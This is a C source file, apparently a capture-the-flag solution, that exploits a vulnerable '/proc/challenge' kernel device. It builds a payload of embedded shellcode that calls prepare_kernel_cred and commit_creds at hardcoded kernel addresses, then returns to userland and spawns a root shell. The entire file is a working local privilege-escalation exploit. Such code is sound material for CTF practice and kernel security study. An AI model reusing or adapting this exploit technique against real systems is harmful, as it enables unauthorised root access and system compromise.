#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

unsigned long long int user_cs, user_ss, user_sp, user_rflags;
void save_state()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[*] Saved state");
}

unsigned long long int glob_fd;
void open_device()
{
	glob_fd = open("/proc/challenge", O_RDWR);
	if (glob_fd < 0)
	{
		puts("[!] Failed to open device");
		exit(-1);
	}
	else
		puts("[*] Opened device");
}

void get_shell()
{
	puts("[*] Returned to userland");
	if (getuid()==0)
	{
		printf("[*] UID: %d, got root!\n", getuid());
		system("/bin/sh");
	}
	else
	{
		printf("[!] UID: %d, didn't get root!\n", getuid());
		exit(-1);
	}
}
unsigned long long int user_rip = (long long unsigned int)get_shell;

// prepare_kernel_cred: 0xffffffff81084d30
// commit_creds:        0xffffffff810848f0
// swapgs_restore_regs_and_return_to_usermode: 0xffffffff81c00a2f
char payload[0x1000];
void generate_payload()
{
	unsigned int *p = (unsigned int *)payload;
	unsigned int i = 0;

	/////////////////////////////////////////////////////
	////// Stage 2: Execute prepare_kernel_cred(0) //////
	/////////////////////////////////////////////////////
	// mov eax, 0xffffffff
	i += sprintf(&payload[i], "jmp %u\n", 12*1+10*0+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d55ffffffffb8LL);

	// shl rax, 32
	i += sprintf(&payload[i], "jmp %u\n", 12*2+10*1+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d555d20e0c148LL);

	// mov edx, 0x81084d30
	i += sprintf(&payload[i], "jmp %u\n", 12*3+10*2+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d5581084d30baLL);

	// or rax, rdx
	i += sprintf(&payload[i], "jmp %u\n", 12*4+10*3+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d555d55d00948LL);

	// xor rdi, rdi ; call rax
	i += sprintf(&payload[i], "jmp %u\n", 12*5+10*4+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d55d0ffff3148LL);

	// mov rcx, rax
	i += sprintf(&payload[i], "jmp %u\n", 12*6+10*5+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d555d55c18948LL);

	/////////////////////////////////////////////
	////// Stage 3: Execute commit_creds() //////
	/////////////////////////////////////////////
	// mov eax, 0xffffffff
	i += sprintf(&payload[i], "jmp %u\n", 12*7+10*6+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d55ffffffffb8LL);

	// shl rax, 32
	i += sprintf(&payload[i], "jmp %u\n", 12*8+10*7+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d555d20e0c148LL);

	// mov edx, 0x810848f0
	i += sprintf(&payload[i], "jmp %u\n", 12*9+10*8+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d55810848f0baLL);

	// or rax, rdx
	i += sprintf(&payload[i], "jmp %u\n", 12*10+10*9+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d555d55d00948LL);

	// mov rdi, rcx ; call rax
	i += sprintf(&payload[i], "jmp %u\n", 12*11+10*10+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d55d0ffcf8948LL);

	///////////////////////////////////////////////////
	////// Stage 4: Load userland state to stack //////
	///////////////////////////////////////////////////
	// push rax ; push rbx ; push rcx ; push rdx
	i += sprintf(&payload[i], "mve a %llu\n", user_ss);
	i += sprintf(&payload[i], "mve b %llu\n", user_sp);
	i += sprintf(&payload[i], "mve c %llu\n", user_rflags);
	i += sprintf(&payload[i], "mve d %llu\n", user_cs);
	i += sprintf(&payload[i], "jmp %u\n", 12*12+10*15+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555d555d52515350LL);

	// push rax ; push rbx ; push rcx ; shl rcx, 32
	i += sprintf(&payload[i], "mve a %llu\n", user_rip);
	i += sprintf(&payload[i], "mve b %u\n", 0);
	i += sprintf(&payload[i], "mve c %u\n", 0xffffffff);
	i += sprintf(&payload[i], "mve d %u\n", 0x81c00a2f + 22);
	i += sprintf(&payload[i], "jmp %u\n", 12*13+10*20+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0x555b20e1c1485350LL);

	////////////////////////////////
	////// Stage 5: Get shell //////
	////////////////////////////////
	// or rcx, rdx ; call rcx
	i += sprintf(&payload[i], "jmp %u\n", 12*14+10*21+2);
	i += sprintf(&payload[i], "mve d %llu\n", 0xd1ffd10948LL);

	i += sprintf(&payload[i], "jmp %u", 0);
}

int main()
{
	//////////////////////////////////////////
	////// Stage 1: Save userland state //////
	//////////////////////////////////////////
	save_state();
	open_device();

	puts("[*] Generating payload...");
	generate_payload();

	puts("[*] Sending payload...");
	write(glob_fd, payload, sizeof(payload));
}




